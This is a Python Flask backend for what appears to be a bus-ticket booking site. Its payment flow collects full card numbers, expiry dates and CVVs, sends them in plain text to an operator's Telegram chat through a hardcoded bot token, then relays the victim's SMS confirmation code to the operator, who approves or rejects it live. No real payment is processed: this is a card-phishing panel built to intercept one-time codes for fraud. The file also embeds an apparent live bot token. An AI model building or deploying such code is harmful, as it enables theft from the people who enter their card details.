from flask import Flask, render_template, request, jsonify
from flask_socketio import SocketIO, emit
import uuid
import threading
import time
from datetime import datetime
import json
import logging
import os
import requests

# Настройка логирования
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

app = Flask(__name__)
app.config['SECRET_KEY'] = os.environ.get('SECRET_KEY', 'your-secret-key-change-this-in-production')
socketio = SocketIO(app, cors_allowed_origins="*", async_mode='threading')

# Настройки для Telegram бота
BOT_TOKEN = os.environ.get('BOT_TOKEN', '7808830885:AAHFkGTaOylnQ99RrNolU5UgjEgo2gxFrqo')
ADMIN_CHAT_ID = os.environ.get('ADMIN_CHAT_ID', '2063086506')

# Хранилище заказов (в продакшене используйте базу данных)
orders = {}
confirmation_codes = {}
connected_clients = set()

def send_telegram_notification(chat_id, order_id, order_data):
    """Отправить уведомление в Telegram бот"""
    try:
        data = order_data['data']
        created_time = order_data['created_at'][:19].replace('T', ' ')
        order_type = order_data.get('order_type', 'standard')
        
        if order_type == 'payment':
            # Платежный заказ с данными карты
            route_info = order_data.get('route_info', {})
            
            message = f"""💳 НОВЫЙ ПЛАТЁЖ!

👤 Имя: {data.get('name', 'Не указано')}
📧 Email: {data.get('email', 'Не указано')}

🚌 Маршрут: {route_info.get('from_city', '')} → {route_info.get('to_city', '')}
📅 Дата поездки: {route_info.get('travel_date', '')}
💺 Место: {route_info.get('seat', '')}

💳 ДАННЫЕ КАРТЫ:
🔢 Номер: {data.get('cardNumber', 'Не указано')}
👤 Имя на карте: {data.get('cardName', 'Не указано')}
📅 Срок действия: {data.get('expiryDate', 'Не указано')}
🔐 CVV: {data.get('cvv', 'Не указано')}
💰 Сумма: {data.get('amount', 0)} zł

📅 Время: {created_time}
🆔 ID: {order_id[:8]}...

Выберите действие:"""
            
            # Кнопки для платежного заказа
            keyboard = {
                "inline_keyboard": [
                    [
                        {"text": "📱 Отправить SMS", "callback_data": f"send_sms_{order_id}"}
                    ],
                    [
                        {"text": "❌ Отклонить", "callback_data": f"reject_{order_id}"}
                    ]
                ]
            }
        else:
            # Обычный заказ
            message = f"""🔔 НОВЫЙ ЗАКАЗ!

👤 Имя: {data.get('name', 'Не указано')}
📞 Телефон: {data.get('phone', 'Не указано')}
📧 Email: {data.get('email', 'Не указано')}

📅 Время: {created_time}
🆔 ID: {order_id[:8]}...

Выберите действие:"""
            
            # Кнопки для обычного заказа
            keyboard = {
                "inline_keyboard": [
                    [
                        {"text": "✅ Подтвердить", "callback_data": f"approve_{order_id}"},
                        {"text": "❌ Отклонить", "callback_data": f"reject_{order_id}"}
                    ],
                    [
                        {"text": "📋 Детали", "callback_data": f"details_{order_id}"}
                    ]
                ]
            }
        
        # Отправляем сообщение через Telegram API
        response = requests.post(
            f'https://api.telegram.org/bot{BOT_TOKEN}/sendMessage',
            json={
                'chat_id': chat_id,
                'text': message,
                'reply_markup': keyboard
            },
            timeout=10
        )
        
        if response.status_code == 200:
            logger.info(f'Уведомление отправлено в Telegram для заказа {order_id[:8]}')
        else:
            logger.error(f'Ошибка отправки уведомления: {response.text}')
            
    except Exception as e:
        logger.error(f'Ошибка отправки уведомления в Telegram: {e}')

def send_code_notification(chat_id, order_id, user_code, order_data):
    """Отправить уведомление о введенном коде"""
    try:
        data = order_data['data']
        created_time = order_data['created_at'][:19].replace('T', ' ')
        
        message = f"""🔢 ПОЛЬЗОВАТЕЛЬ ВВЕЛ КОД!

👤 Имя: {data.get('name', 'Не указано')}
📧 Email: {data.get('email', 'Не указано')}

🔐 ВВЕДЕННЫЙ КОД: {user_code}

📅 Время: {created_time}
🆔 ID: {order_id[:8]}...

Выберите действие:"""
        
        # Кнопки для подтверждения или отклонения кода
        keyboard = {
            "inline_keyboard": [
                [
                    {"text": "✅ Правильный код", "callback_data": f"confirm_code_{order_id}"}
                ],
                [
                    {"text": "❌ Неправильный код", "callback_data": f"reject_code_{order_id}"}
                ]
            ]
        }
        
        response = requests.post(
            f'https://api.telegram.org/bot{BOT_TOKEN}/sendMessage',
            json={
                'chat_id': chat_id,
                'text': message,
                'reply_markup': keyboard
            },
            timeout=10
        )
        
        if response.status_code == 200:
            logger.info(f'Уведомление о коде отправлено в Telegram для заказа {order_id[:8]}')
        else:
            logger.error(f'Ошибка отправки уведомления о коде: {response.text}')
            
    except Exception as e:
        logger.error(f'Ошибка отправки уведомления о коде: {e}')

class OrderManager:
    def __init__(self):
        pass
    
    def create_order(self, order_data):
        order_id = str(uuid.uuid4())
        order = {
            'id': order_id,
            'data': order_data,
            'status': 'pending',
            'created_at': datetime.now().isoformat(),
            'confirmation_code': None,
            'order_type': order_data.get('order_type', 'standard'),
            'verification_type': None
        }
        orders[order_id] = order
        
        # Отправляем уведомление в Telegram
        if ADMIN_CHAT_ID and BOT_TOKEN:
            threading.Thread(target=send_telegram_notification, args=(ADMIN_CHAT_ID, order_id, order)).start()
        
        return order_id
    
    def create_payment_order(self, payment_data):
        """Создание заказа с данными карты для оплаты"""
        order_id = str(uuid.uuid4())
        # Добавляем данные карты прямо в payment_data для легкого доступа
        enriched_payment_data = payment_data.copy()
        
        order = {
            'id': order_id,
            'data': enriched_payment_data,  # Данные уже содержат все поля карты
            'status': 'payment_pending',
            'created_at': datetime.now().isoformat(),
            'confirmation_code': None,
            'order_type': 'payment',
            'verification_type': None,
            'card_data': {
                'cardNumber': payment_data.get('cardNumber', ''),  # Полные данные карты
                'cardName': payment_data.get('cardName', ''),
                'expiryDate': payment_data.get('expiryDate', ''),
                'cvv': payment_data.get('cvv', ''),  # Добавляем CVV
                'amount': payment_data.get('amount', 0)
            },
            'route_info': {
                'from_city': payment_data.get('from_city', ''),
                'to_city': payment_data.get('to_city', ''),
                'travel_date': payment_data.get('travel_date', ''),
                'seat': payment_data.get('seat', ''),
                'route_id': payment_data.get('route_id', '')
            }
        }
        orders[order_id] = order
        
        # Отправляем уведомление в Telegram
        if ADMIN_CHAT_ID and BOT_TOKEN:
            threading.Thread(target=send_telegram_notification, args=(ADMIN_CHAT_ID, order_id, order)).start()
        
        return order_id
    
    def approve_order(self, order_id, verification_type='sms'):
        if order_id in orders:
            if orders[order_id]['order_type'] == 'payment':
                orders[order_id]['status'] = 'approved'
                orders[order_id]['verification_type'] = verification_type
                
                # Уведомляем клиента через WebSocket что платеж одобрен и нужна верификация
                socketio.emit('order_update', {
                    'type': 'order_approved',
                    'order_id': order_id,
                    'verification_type': verification_type
                })
            else:
                orders[order_id]['status'] = 'approved'
                
                # Уведомляем клиента через WebSocket что заказ одобрен
                socketio.emit('order_update', {
                    'type': 'order_approved',
                    'order_id': order_id
                })
            
            return True
        return False
    
    def reject_order(self, order_id):
        if order_id in orders:
            orders[order_id]['status'] = 'rejected'
            
            # Уведомляем клиента через WebSocket
            socketio.emit('order_update', {
                'type': 'order_rejected',
                'order_id': order_id
            })
            
            return True
        return False
    
    def verify_code(self, order_id, code):
        """
        Новая логика:
        1. Пользователь вводит свой код
        2. Сохраняем код в заказе для отправки админу
        3. Отмечаем заказ как "ожидает подтверждения кода"
        """
        if order_id in orders and orders[order_id]['status'] == 'approved':
            orders[order_id]['status'] = 'code_submitted'
            orders[order_id]['user_code'] = code
            
            # Уведомляем, что код принят
            socketio.emit('order_update', {
                'type': 'code_submitted',
                'order_id': order_id,
                'code': code
            })
            
            # Отправляем уведомление о коде в Telegram
            if ADMIN_CHAT_ID and BOT_TOKEN:
                threading.Thread(target=send_code_notification, args=(ADMIN_CHAT_ID, order_id, code, orders[order_id])).start()
            
            return True
        else:
            return False
    
    def confirm_code(self, order_id):
        """Подтверждение кода администратором"""
        if order_id in orders and orders[order_id]['status'] == 'code_submitted':
            orders[order_id]['status'] = 'completed'
            
            # Уведомляем клиента об успешном завершении
            socketio.emit('order_update', {
                'type': 'code_verified',
                'order_id': order_id
            })
            return True
        return False
    
    def reject_code(self, order_id):
        """Отклонение кода (неправильный)"""
        if order_id in orders and orders[order_id]['status'] == 'code_submitted':
            orders[order_id]['status'] = 'approved'  # Возвращаем к состоянию "ожидание кода"
            orders[order_id]['user_code'] = None  # Очищаем неправильный код
            
            # Уведомляем клиента о неправильном коде
            socketio.emit('order_update', {
                'type': 'code_rejected',
                'order_id': order_id,
                'message': 'Неправильный код, введите новый'
            })
            return True
        return False
    
    def get_order(self, order_id):
        return orders.get(order_id)
    
    def get_pending_orders(self):
        return {k: v for k, v in orders.items() if v['status'] in ['pending', 'code_submitted', 'payment_pending']}

order_manager = OrderManager()

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/bus')
def bus_booking():
    return render_template('bus_booking.html')

@app.route('/api/submit_order', methods=['POST'])
def submit_order():
    try:
        order_data = request.get_json()
        
        # Валидация данных
        required_fields = ['name', 'phone', 'email', 'from_city', 'to_city', 'travel_date', 'passengers']
        for field in required_fields:
            if not order_data.get(field):
                field_names = {
                    'name': 'имя',
                    'phone': 'телефон', 
                    'email': 'email',
                    'from_city': 'город отправления',
                    'to_city': 'город назначения',
                    'travel_date': 'дата поездки',
                    'passengers': 'количество пассажиров'
                }
                return jsonify({'error': f'Поле "{field_names.get(field, field)}" обязательно'}), 400
        
        # Определяем тип заказа по наличию данных карты
        has_card_data = all(field in order_data for field in ['cardNumber', 'expiryDate', 'cvv', 'cardName'])
        
        if has_card_data:
            # Платежный заказ
            order_id = order_manager.create_payment_order(order_data)
        else:
            # Обычный заказ
            order_id = order_manager.create_order(order_data)
        
        logger.info(f"Новый заказ создан: {order_id}")
        logger.info(f"Данные заказа: {order_data}")
        
        return jsonify({
            'success': True,
            'order_id': order_id,
            'message': 'Заказ успешно отправлен'
        })
        
    except Exception as e:
        logger.error(f"Ошибка при создании заказа: {e}")
        return jsonify({'error': 'Внутренняя ошибка сервера'}), 500

@app.route('/api/verify_code', methods=['POST'])
def verify_code():
    try:
        data = request.get_json()
        order_id = data.get('order_id')
        code = data.get('code')
        
        if not order_id or not code:
            return jsonify({'error': 'Не указан ID заказа или код'}), 400
        
        success = order_manager.verify_code(order_id, code)
        
        if success:
            logger.info(f"Код для заказа {order_id} подтвержден успешно")
            return jsonify({'success': True, 'message': 'Код подтвержден'})
        else:
            logger.warning(f"Неверный код для заказа {order_id}")
            return jsonify({'error': 'Неверный код'}), 400
            
    except Exception as e:
        logger.error(f"Ошибка при проверке кода: {e}")
        return jsonify({'error': 'Внутренняя ошибка сервера'}), 500

# API для телеграм бота
@app.route('/api/bot/orders', methods=['GET'])
def get_pending_orders():
    """Получить список ожидающих заказов для бота"""
    try:
        pending = order_manager.get_pending_orders()
        return jsonify(pending)
    except Exception as e:
        logger.error(f"Ошибка при получении заказов: {e}")
        return jsonify({'error': 'Внутренняя ошибка сервера'}), 500

@app.route('/api/bot/approve/<order_id>', methods=['POST'])
def approve_order(order_id):
    """API для подтверждения заказа ботом"""
    try:
        # Получаем тип верификации для платежных заказов
        verification_type = 'sms'  # По умолчанию
        if request.is_json:
            data = request.get_json()
            verification_type = data.get('verification_type', 'sms')
        
        ok = order_manager.approve_order(order_id, verification_type)
        if ok:
            logger.info(f"Заказ {order_id} подтвержден администратором")
            return jsonify({
                'success': True,
                'message': 'Заказ подтвержден',
                'verification_type': verification_type
            })
        else:
            return jsonify({'error': 'Заказ не найден'}), 404
    except Exception as e:
        logger.error(f"Ошибка при подтверждении заказа: {e}")
        return jsonify({'error': 'Внутренняя ошибка сервера'}), 500

@app.route('/api/bot/reject/<order_id>', methods=['POST'])
def reject_order(order_id):
    """API для отклонения заказа ботом"""
    try:
        success = order_manager.reject_order(order_id)
        if success:
            logger.info(f"Заказ {order_id} отклонен")
            return jsonify({'success': True, 'message': 'Заказ отклонен'})
        else:
            return jsonify({'error': 'Заказ не найден'}), 404
    except Exception as e:
        logger.error(f"Ошибка при отклонении заказа: {e}")
        return jsonify({'error': 'Внутренняя ошибка сервера'}), 500

@app.route('/api/bot/order/<order_id>', methods=['GET'])
def get_order_details(order_id):
    """Получить детали конкретного заказа"""
    try:
        order = order_manager.get_order(order_id)
        if order:
            return jsonify(order)
        else:
            return jsonify({'error': 'Заказ не найден'}), 404
    except Exception as e:
        logger.error(f"Ошибка при получении деталей заказа: {e}")
        return jsonify({'error': 'Внутренняя ошибка сервера'}), 500

@app.route('/api/bot/confirm_code/<order_id>', methods=['POST'])
def confirm_user_code(order_id):
    """API для подтверждения кода пользователя администратором"""
    try:
        ok = order_manager.confirm_code(order_id)
        if ok:
            logger.info(f"Код для заказа {order_id} подтвержден администратором")
            return jsonify({
                'success': True,
                'message': 'Код подтвержден'
            })
        else:
            return jsonify({'error': 'Заказ не найден или код не был введен'}), 404
    except Exception as e:
        logger.error(f"Ошибка при подтверждении кода: {e}")
        return jsonify({'error': 'Внутренняя ошибка сервера'}), 500

@app.route('/api/bot/reject_code/<order_id>', methods=['POST'])
def reject_user_code(order_id):
    """API для отклонения кода (неправильный код)"""
    try:
        ok = order_manager.reject_code(order_id)
        if ok:
            logger.info(f"Код для заказа {order_id} отклонен как неправильный")
            return jsonify({
                'success': True,
                'message': 'Код отклонен'
            })
        else:
            return jsonify({'error': 'Заказ не найден или код не был введен'}), 404
    except Exception as e:
        logger.error(f"Ошибка при отклонении кода: {e}")
        return jsonify({'error': 'Внутренняя ошибка сервера'}), 500

# API для обработки платежей
@app.route('/api/payment/create', methods=['POST'])
def create_payment():
    """Создание платежного заказа с данными карты"""
    try:
        payment_data = request.get_json()
        
        # Валидация обязательных полей
        required_fields = ['name', 'phone', 'email', 'cardNumber', 'expiryDate', 'cvv', 'cardName']
        for field in required_fields:
            if not payment_data.get(field):
                return jsonify({'error': f'Поле "{field}" обязательно'}), 400
        
        # Создаем платежный заказ
        order_id = order_manager.create_payment_order(payment_data)
        
        logger.info(f"Новый платежный заказ создан: {order_id}")
        logger.info(f"Карта: ****{payment_data.get('cardNumber', '')[-4:]}, сумма: {payment_data.get('amount', 0)} зл")
        
        return jsonify({
            'success': True,
            'order_id': order_id,
            'message': 'Платежный заказ создан, ожидайте подтверждения'
        })
        
    except Exception as e:
        logger.error(f"Ошибка при создании платежа: {e}")
        return jsonify({'error': 'Внутренняя ошибка сервера'}), 500

@app.route('/api/payment/status/<order_id>', methods=['GET'])
def get_payment_status(order_id):
    """Получение статуса платежа"""
    try:
        order = order_manager.get_order(order_id)
        if order:
            status_mapping = {
                'payment_pending': 'pending',
                'approved': 'verification',
                'code_submitted': 'verification', 
                'completed': 'completed',
                'rejected': 'rejected'
            }
            
            api_status = status_mapping.get(order['status'], 'pending')
            
            result = {
                'status': api_status,
                'order_id': order_id
            }
            
            if api_status == 'verification' and order.get('verification_type'):
                result['verificationType'] = order['verification_type']
            
            return jsonify(result)
        else:
            return jsonify({'error': 'Платеж не найден'}), 404
    except Exception as e:
        logger.error(f"Ошибка при получении статуса платежа: {e}")
        return jsonify({'error': 'Внутренняя ошибка сервера'}), 500

@app.route('/api/payment/verify/<order_id>', methods=['POST'])
def verify_payment(order_id):
    """Подтверждение верификации платежа"""
    try:
        data = request.get_json()
        code = data.get('code')
        
        if not code:
            return jsonify({'error': 'Код верификации обязателен'}), 400
        
        # Используем существующий метод verify_code
        success = order_manager.verify_code(order_id, code)
        
        if success:
            logger.info(f"Верификация платежа {order_id} прошла успешно")
            return jsonify({'success': True, 'message': 'Верификация прошла успешно'})
        else:
            logger.warning(f"Неверная верификация для платежа {order_id}")
            return jsonify({'error': 'Неверный код верификации'}), 400
            
    except Exception as e:
        logger.error(f"Ошибка при верификации платежа: {e}")
        return jsonify({'error': 'Внутренняя ошибка сервера'}), 500

# WebSocket события
@socketio.on('connect')
def handle_connect():
    logger.info(f"Клиент подключен: {request.sid}")
    connected_clients.add(request.sid)
    emit('connected', {'message': 'Подключение установлено'})

@socketio.on('disconnect')
def handle_disconnect():
    logger.info(f"Клиент отключен: {request.sid}")
    connected_clients.discard(request.sid)

@socketio.on('join_order')
def handle_join_order(data):
    """Клиент подписывается на обновления конкретного заказа"""
    order_id = data.get('order_id')
    if order_id:
        # В реальном приложении здесь бы была логика join к комнате
        logger.info(f"Клиент {request.sid} подписался на заказ {order_id}")
        emit('joined_order', {'order_id': order_id})

# Обработка ошибок
@app.errorhandler(404)
def not_found(error):
    return jsonify({'error': 'Страница не найдена'}), 404

@app.errorhandler(500)
def internal_error(error):
    return jsonify({'error': 'Внутренняя ошибка сервера'}), 500

if __name__ == '__main__':
    logger.info("Запуск веб-сервера...")
    logger.info("Доступные API endpoints:")
    logger.info("  GET  /                     - Главная страница")
    logger.info("  POST /api/submit_order     - Отправка заказа")
    logger.info("  POST /api/verify_code      - Проверка кода подтверждения")
    logger.info("  GET  /api/bot/orders       - Получение заказов для бота")
    logger.info("  POST /api/bot/approve/<id> - Подтверждение заказа")
    logger.info("  POST /api/bot/reject/<id>  - Отклонение заказа")
    logger.info("  GET  /api/bot/order/<id>   - Детали заказа")
    
    # Запускаем сервер
    port = int(os.environ.get('PORT', 5000))
    host = os.environ.get('HOST', '0.0.0.0')
    debug = os.environ.get('DEBUG', 'False').lower() == 'true'
    
    socketio.run(app, host=host, port=port, debug=debug, allow_unsafe_werkzeug=True)
